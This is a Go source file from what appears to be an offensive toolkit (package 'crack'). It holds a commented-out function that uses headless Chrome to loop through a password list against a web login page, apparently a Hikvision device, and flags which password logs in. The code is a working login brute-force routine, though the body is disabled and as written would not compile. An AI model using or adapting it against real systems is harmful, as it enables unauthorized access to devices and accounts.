package crack

// xpth 0 输入用户名 xpth 1 输入密码 xpth 2 登录按钮
func CheckLogin(url string, headless bool, xpath, username, password []string) {
	// 设置 Chrome 执行选项
	// opts := append(chromedp.DefaultExecAllocatorOptions[:],
	// 	chromedp.Flag("headless", headless),
	// 	chromedp.Flag("disable-gpu", false), // 启用 GPU 加速
	// 	chromedp.Flag("disable-background-timer-throttling", false),
	// 	chromedp.Flag("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"),
	// 	chromedp.Flag("ignore-certificate-errors", true),
	// )

	// // 创建执行上下文
	// allocatorCtx, chromedpCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	// defer chromedpCancel()

	// var errorMessage string

	// // 创建主上下文
	// ctx, cancel := chromedp.NewContext(allocatorCtx)
	// defer cancel()

	// // 遍历密码进行尝试登录
	// for _, pass := range password {
	// 	// 设置超时时间
	// 	loginCtx, cancel := context.WithTimeout(ctx, time.Second*15)
	// 	defer cancel()

	// 	// 执行任务
	// 	err := chromedp.Run(loginCtx,
	// 		chromedp.Navigate(url), // 访问目标地址
	// 		// 等待页面加载完成，确保表单已出现
	// 		chromedp.WaitReady(`/html/body/div[2]/table/tbody/tr/td[2]/div/div[3]/input`),
	// 		chromedp.SendKeys(`/html/body/div[2]/table/tbody/tr/td[2]/div/div[3]/input`, username), // 输入用户名
	// 		chromedp.SendKeys(`//*[@id="password"]`, pass),                                         // 输入密码
	// 		chromedp.Click(`//*[@id="login"]/table/tbody/tr/td[2]/div/div[5]/button`),              // 点击登录
	// 		chromedp.Text(`label.ng-binding`, &errorMessage, chromedp.NodeVisible),
	// 	)
	// 	if err != nil {
	// 		return fmt.Sprintf("[-] %s  %v\n", url, err)
	// 	}

	// 	// 根据 URL 判断登录是否成功
	// 	if strings.Contains(errorMessage, "用户名或密码不正确") || strings.Contains(errorMessage, "Incorrect user name or password") {
	// 		gologger.Info(appCtx, fmt.Sprintf("[hivision] %s admin:%s login failed", url, pass))
	// 	} else {
	// 		return fmt.Sprintf("[+] %s admin:%s login success!!\n", url, pass)
	// 	}
	// }

	// return fmt.Sprintf("[-] %s all passwords failed to login\n", url)
}
